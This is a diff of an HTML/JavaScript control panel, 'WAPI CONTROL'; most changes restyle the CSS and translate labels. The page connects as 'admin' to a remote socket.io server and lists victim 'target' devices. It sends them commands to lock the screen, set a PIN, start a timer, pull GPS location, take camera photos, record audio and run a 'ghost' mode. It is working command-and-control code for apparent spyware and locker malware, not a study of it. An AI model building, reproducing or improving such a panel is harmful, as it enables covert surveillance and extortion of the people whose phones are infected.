@@ -2,64 +2,241 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,viewport-fit=cover,user-scalable=no">
     <title>WAPI CONTROL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #000000; --card: #1c1c1e; --border: #2c2c2e; --red: #ff3b30; --orange: #ff9500;
-            --blue: #007aff; --green: #34c759; --purple: #af52de; --text: #ffffff; --text2: #8e8e93;
+            --bg-primary: #06080d;
+            --bg-secondary: #0a0e16;
+            --bg-card: rgba(12, 16, 26, 0.7);
+            --bg-card-hover: rgba(16, 21, 34, 0.85);
+            --border-subtle: rgba(30, 60, 120, 0.25);
+            --border-glow: rgba(0, 180, 255, 0.35);
+            --border-active: rgba(0, 200, 255, 0.6);
+            --accent-primary: #0088ff;
+            --accent-cyan: #00c8ff;
+            --accent-blue: #0066dd;
+            --accent-red: #ff3355;
+            --accent-green: #00e676;
+            --accent-orange: #ff9500;
+            --accent-purple: #aa44ff;
+            --text-primary: #e8ecf4;
+            --text-secondary: #8899bb;
+            --text-dim: #556688;
+            --text-bright: #ffffff;
+            --glow-cyan: 0 0 20px rgba(0,200,255,.25);
+            --glow-blue: 0 0 18px rgba(0,136,255,.2);
+            --shadow-card: 0 4px 24px rgba(0,0,0,.5);
+            --radius-sm: 14px;
+            --radius-md: 20px;
+            --radius-lg: 24px;
+            --radius-xl: 28px;
         }
         *{margin:0;padding:0;box-sizing:border-box}
-        body{background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;padding:12px;min-height:100vh}
-        .header{text-align:center;padding:20px 0 10px}
-        .header h1{font-size:26px;font-weight:700;letter-spacing:-1px;color:var(--red)}
-        .header .sub{font-size:12px;color:var(--text2);margin-top:2px}
-        .card{background:var(--card);border-radius:16px;padding:16px;margin-bottom:10px}
-        .card h3{font-size:13px;font-weight:600;color:var(--red);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
-        input{width:100%;padding:12px 16px;background:#2c2c2e;color:var(--text);border:none;border-radius:12px;font-size:14px;outline:none}
-        input::placeholder{color:var(--text2)}
-        button{padding:13px 10px;margin:3px;border:none;border-radius:12px;font-weight:600;font-size:12px;cursor:pointer;transition:opacity .2s}
-        button:active{opacity:.7}
-        .btn-red{background:var(--red);color:#fff}.btn-green{background:var(--green);color:#fff}
-        .btn-blue{background:var(--blue);color:#fff}.btn-orange{background:var(--orange);color:#fff}
-        .btn-purple{background:var(--purple);color:#fff}.btn-gray{background:#3a3a3c;color:var(--text)}
+        body{
+            background:var(--bg-primary);
+            background-image:
+                radial-gradient(ellipse at 50% 0%,rgba(0,180,255,.06) 0%,transparent 60%),
+                radial-gradient(ellipse at 80% 20%,rgba(0,200,255,.03) 0%,transparent 50%),
+                radial-gradient(ellipse at 20% 80%,rgba(0,100,255,.03) 0%,transparent 50%);
+            color:var(--text-primary);
+            font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;
+            padding:10px;
+            min-height:100vh;
+            -webkit-font-smoothing:antialiased;
+        }
+        .header{
+            text-align:center;
+            padding:28px 0 16px;
+            position:relative;
+        }
+        .header h1{
+            font-size:28px;
+            font-weight:800;
+            letter-spacing:-1px;
+            background:linear-gradient(135deg,var(--accent-cyan),var(--accent-primary),var(--accent-blue));
+            -webkit-background-clip:text;
+            -webkit-text-fill-color:transparent;
+            background-clip:text;
+            filter:drop-shadow(0 0 12px rgba(0,180,255,.4));
+        }
+        .header .sub{
+            font-size:11px;
+            color:var(--text-dim);
+            letter-spacing:3px;
+            text-transform:uppercase;
+            margin-top:4px;
+            font-weight:500;
+        }
+        .header::after{
+            content:'';
+            display:block;
+            width:60px;
+            height:2px;
+            background:linear-gradient(90deg,transparent,var(--accent-cyan),transparent);
+            margin:10px auto 0;
+            border-radius:2px;
+        }
+        .card{
+            background:var(--bg-card);
+            backdrop-filter:blur(20px);
+            -webkit-backdrop-filter:blur(20px);
+            border:1px solid var(--border-subtle);
+            border-radius:var(--radius-lg);
+            padding:18px;
+            margin-bottom:10px;
+            box-shadow:var(--shadow-card);
+            transition:all .3s ease;
+        }
+        .card h3{
+            font-size:12px;
+            font-weight:700;
+            color:var(--accent-cyan);
+            margin-bottom:12px;
+            text-transform:uppercase;
+            letter-spacing:2px;
+            display:flex;
+            align-items:center;
+            gap:8px;
+        }
+        .card h3::before{
+            content:'';
+            width:6px;
+            height:6px;
+            background:var(--accent-cyan);
+            border-radius:50%;
+            box-shadow:0 0 10px var(--accent-cyan);
+        }
+        input{
+            width:100%;
+            padding:13px 16px;
+            background:rgba(8,12,22,.8);
+            color:var(--text-primary);
+            border:1px solid var(--border-subtle);
+            border-radius:var(--radius-sm);
+            font-size:13px;
+            font-family:'Inter',sans-serif;
+            outline:none;
+            transition:all .3s;
+            letter-spacing:.5px;
+        }
+        input:focus{
+            border-color:var(--border-glow);
+            box-shadow:var(--glow-cyan);
+        }
+        input::placeholder{color:var(--text-dim)}
+        button{
+            padding:13px 10px;
+            margin:3px;
+            border:1px solid transparent;
+            border-radius:var(--radius-sm);
+            font-weight:600;
+            font-size:11px;
+            cursor:pointer;
+            transition:all .25s ease;
+            letter-spacing:.5px;
+            font-family:'Inter',sans-serif;
+            position:relative;
+            overflow:hidden;
+        }
+        button:active{transform:scale(.95)}
+        button::after{
+            content:'';
+            position:absolute;
+            top:0;left:0;width:100%;height:100%;
+            background:linear-gradient(180deg,transparent 30%,rgba(255,255,255,.03));
+            pointer-events:none;
+        }
+        .btn-cyan{background:rgba(0,180,255,.12);color:var(--accent-cyan);border-color:rgba(0,180,255,.25)}
+        .btn-cyan:hover{background:rgba(0,180,255,.2);box-shadow:var(--glow-cyan)}
+        .btn-red{background:rgba(255,51,85,.12);color:var(--accent-red);border-color:rgba(255,51,85,.25)}
+        .btn-red:hover{background:rgba(255,51,85,.2);box-shadow:0 0 18px rgba(255,51,85,.25)}
+        .btn-green{background:rgba(0,230,118,.12);color:var(--accent-green);border-color:rgba(0,230,118,.25)}
+        .btn-green:hover{background:rgba(0,230,118,.2);box-shadow:0 0 18px rgba(0,230,118,.25)}
+        .btn-blue{background:rgba(0,136,255,.12);color:var(--accent-primary);border-color:rgba(0,136,255,.25)}
+        .btn-blue:hover{background:rgba(0,136,255,.2);box-shadow:var(--glow-blue)}
+        .btn-orange{background:rgba(255,149,0,.12);color:var(--accent-orange);border-color:rgba(255,149,0,.25)}
+        .btn-purple{background:rgba(170,68,255,.12);color:var(--accent-purple);border-color:rgba(170,68,255,.25)}
+        .btn-gray{background:rgba(255,255,255,.04);color:var(--text-secondary);border-color:rgba(255,255,255,.06)}
+        .btn-gray:hover{background:rgba(255,255,255,.08)}
         .btn-full{width:100%}
-        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:6px}
-        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px}
-        .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px}
-        .dot-on{background:var(--green)}.dot-off{background:var(--red)}
-        .target-item{background:#2c2c2e;padding:12px;border-radius:12px;margin:4px 0;cursor:pointer;display:flex;justify-content:space-between;align-items:center;font-size:12px}
-        .target-item.active{background:#3a1a1a}
-        hr{border:none;border-top:1px solid var(--border);margin:10px 0}
-        #status{font-size:11px;color:var(--text2);margin-top:4px}
-        .active-target{color:var(--red);font-weight:600}
-        .status-bar{display:flex;flex-wrap:wrap;gap:5px;margin-bottom:10px;font-size:9px}
-        .status-tag{padding:5px 10px;border-radius:10px;background:#2c2c2e;color:var(--text2)}
-        .status-tag.on{background:#1a2a1a;color:var(--green)}
-        .section-title{font-size:11px;color:var(--text2);text-transform:uppercase;letter-spacing:1px;margin:8px 0 4px}
+        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:7px}
+        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px}
+        .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:8px}
+        .dot-on{background:var(--accent-green);box-shadow:0 0 10px var(--accent-green)}
+        .dot-off{background:var(--accent-red);box-shadow:0 0 10px var(--accent-red)}
+        .target-item{
+            background:rgba(10,14,24,.6);
+            padding:13px 14px;
+            border-radius:var(--radius-sm);
+            margin:4px 0;
+            cursor:pointer;
+            border:1px solid var(--border-subtle);
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            font-size:12px;
+            font-weight:500;
+            transition:all .25s;
+        }
+        .target-item:hover{border-color:var(--border-glow);background:rgba(0,180,255,.05)}
+        .target-item.active{
+            border-color:var(--border-active);
+            background:rgba(0,180,255,.08);
+            box-shadow:var(--glow-cyan);
+        }
+        hr{border:none;border-top:1px solid var(--border-subtle);margin:12px 0}
+        #status{font-size:10px;color:var(--text-dim);margin-top:5px;letter-spacing:1px;font-weight:500}
+        .active-target{color:var(--accent-cyan);font-weight:700;text-shadow:0 0 10px rgba(0,200,255,.3)}
+        .status-bar{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px;font-size:9px}
+        .status-tag{
+            padding:6px 12px;
+            border-radius:20px;
+            background:rgba(255,255,255,.03);
+            color:var(--text-dim);
+            border:1px solid rgba(255,255,255,.05);
+            font-weight:500;
+            letter-spacing:.5px;
+            transition:all .3s;
+        }
+        .status-tag.on{
+            background:rgba(0,230,118,.08);
+            color:var(--accent-green);
+            border-color:rgba(0,230,118,.2);
+            box-shadow:0 0 10px rgba(0,230,118,.1);
+        }
+        .section-title{
+            font-size:10px;
+            color:var(--text-dim);
+            text-transform:uppercase;
+            letter-spacing:2px;
+            margin:10px 0 6px;
+            font-weight:700;
+        }
     </style>
 </head>
 <body>
 
 <div class="header">
     <h1>WAPI CONTROL</h1>
-    <div class="sub">secure terminal &bull; real‑time</div>
+    <div class="sub">cyber terminal &bull; real‑time panel &bull; premium</div>
 </div>
 
 <div class="card">
-    <h3>SERVER</h3>
+    <h3>NODE</h3>
     <input type="text" id="serverUrl" value="https://wafii.pythonanywhere.com">
-    <button class="btn-blue btn-full" onclick="connect()" style="margin-top:6px">Connect</button>
-    <p id="status">Disconnected</p>
+    <button class="btn-cyan btn-full" onclick="connect()" style="margin-top:8px">CONNECT</button>
+    <p id="status">disconnected</p>
 </div>
 
 <div class="card">
     <h3>DEVICES</h3>
-    <div id="targets"><p style="color:var(--text2);font-size:11px;">Waiting for devices...</p></div>
+    <div id="targets"><p style="color:var(--text-dim);font-size:11px;">waiting for devices...</p></div>
 </div>
 
 <div class="card">
-    <h3>CONTROLS — <span id="activeLabel" class="active-target">No Device</span></h3>
+    <h3>CONTROLS &mdash; <span id="activeLabel" class="active-target">no device</span></h3>
     
     <div class="status-bar" id="statusBar">
         <span class="status-tag" id="sLock">LOCK</span>
@@ -70,33 +247,34 @@
         <span class="status-tag" id="sMP3">MP3</span>
     </div>
     
-    <div class="section-title">Actions</div>
+    <div class="section-title">Lock Screen</div>
     <div class="grid-2">
         <button class="btn-red" onclick="send('lock')">🔒 Lock</button>
         <button class="btn-green" onclick="send('unlock')">🔓 Release</button>
     </div>
-    <hr>
-    <input type="text" id="msgInput" placeholder="Pesan ke target...">
-    <button class="btn-blue btn-full" onclick="sendMsg()">📩 Kirim Pesan</button>
-    <hr>
-    <input type="text" id="timerInput" placeholder="Timer (detik)...">
+    
+    <input type="text" id="msgInput" placeholder="Message to target..." style="margin-top:8px">
+    <button class="btn-cyan btn-full" onclick="sendMsg()">📩 Send Message</button>
+    
+    <input type="text" id="timerInput" placeholder="Timer (seconds)..." style="margin-top:6px">
     <button class="btn-red btn-full" onclick="sendTimer()">⏱ Set Timer</button>
-    <hr>
-    <input type="text" id="pinInput" placeholder="Set PIN (4 digit)...">
+    
+    <input type="text" id="pinInput" placeholder="Set PIN (4 digits)..." style="margin-top:6px">
     <button class="btn-orange btn-full" onclick="sendPin()">🔑 Set PIN</button>
-    <hr>
+    
+    <div class="section-title">Actions</div>
     <div class="grid-3">
-        <button class="btn-red" onclick="send('siren')">🔊 Alarm</button>
-        <button class="btn-blue" onclick="send('vibrate')">📳 Vibrate</button>
-        <button class="btn-orange" onclick="send('flash_on')">💡 Strobe</button>
-        <button class="btn-gray" onclick="send('flash_off')">🌑 Off</button>
-        <button class="btn-purple" onclick="send('wallpaper')">🖼 Wall</button>
-        <button class="btn-purple" onclick="send('mp3')">🎵 MP3</button>
-        <button class="btn-blue" onclick="send('gps')">📍 GPS</button>
-        <button class="btn-blue" onclick="send('camera')">📸 Cam</button>
-        <button class="btn-red" onclick="send('record')">🎤 Rec</button>
+        <button class="btn-red" onclick="send('siren')">🔊</button>
+        <button class="btn-blue" onclick="send('vibrate')">📳</button>
+        <button class="btn-orange" onclick="send('flash_on')">💡</button>
+        <button class="btn-gray" onclick="send('flash_off')">🌑</button>
+        <button class="btn-purple" onclick="send('wallpaper')">🖼</button>
+        <button class="btn-purple" onclick="send('mp3')">🎵</button>
+        <button class="btn-cyan" onclick="send('gps')">📍</button>
+        <button class="btn-cyan" onclick="send('camera')">📸</button>
+        <button class="btn-red" onclick="send('record')">🎤</button>
     </div>
-    <hr>
+    
     <div class="section-title">Tools</div>
     <div class="grid-2">
         <button class="btn-orange" onclick="send('ghost')">👻 Ghost</button>
@@ -132,11 +310,11 @@ function updateStatusBar(){
 function connect(){
     var url=document.getElementById('serverUrl').value.trim();
     s=io(url,{query:{role:'admin'}});
-    document.getElementById('status').innerHTML='<span class="dot dot-on"></span> Connected';
+    document.getElementById('status').innerHTML='<span class="dot dot-on"></span> connected';
     s.on('targets',function(d){all=d;render()});
-    s.on('disconnect',function(){document.getElementById('status').innerHTML='<span class="dot dot-off"></span> Disconnected'});
+    s.on('disconnect',function(){document.getElementById('status').innerHTML='<span class="dot dot-off"></span> disconnected'});
 }
-function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:var(--text2);font-size:11px;">No devices</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="dot '+(t.online?'dot-on':'dot-off')+'"></span><b>'+t.id+'</b></span><span style="color:var(--text2)">▶</span></div>'}).join('')}
+function render(){var el=document.getElementById('targets');if(all.length===0){el.innerHTML='<p style="color:var(--text-dim);font-size:11px;">no devices</p>';return}el.innerHTML=all.map(function(t){return'<div class="target-item'+(ct===t.id?' active':'')+'" onclick="select(\''+t.id+'\')"><span><span class="dot '+(t.online?'dot-on':'dot-off')+'"></span><b>'+t.id+'</b></span><span style="color:var(--text-dim)">▶</span></div>'}).join('')}
 function select(id){ct=id;document.getElementById('activeLabel').textContent=id;states={lock:false,siren:false,vibe:false,flash:false,wall:false,mp3:false};updateStatusBar();render()}
 function send(cmd){
     if(!s||!ct){alert('Select device!');return}
@@ -152,4 +330,4 @@ function sendPin(){var p=document.getElementById('pinInput').value.trim();if(!p|
 updateStatusBar();
 </script>
 </body>
-</html>
+        </html>
